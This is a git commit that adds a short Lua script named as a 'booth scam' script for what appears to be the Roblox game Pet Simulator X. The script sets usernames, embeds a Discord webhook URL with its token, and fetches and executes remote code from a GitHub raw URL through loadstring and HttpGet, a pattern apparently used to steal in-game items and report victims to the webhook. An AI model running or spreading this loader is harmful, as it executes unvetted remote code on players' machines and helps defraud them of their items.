360c01a3599c62f01c88b16235b7f412375c0244
OzXENO <109950585+OzXENO@users.noreply.github.com>
2023-03-22 10:08:28 +0100

    Create Psx booth scam script 2023.lua

---
+++ Psx booth scam script 2023.lua
@@ -0,0 +1,4 @@
+UserName = "dinfarerskalet"
+UserName2 = "dinfarerskalet"
+Webhook = "https://discord.com/api/webhooks/1088014920576155648/CyGh1Oi8yXVrUC4uUSySEnW2hRsR8fdpETblUU9rMnyhrG8ee017kc4Lr0aUw6CYVb8F"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/rizzhub/main/New.lua"))()
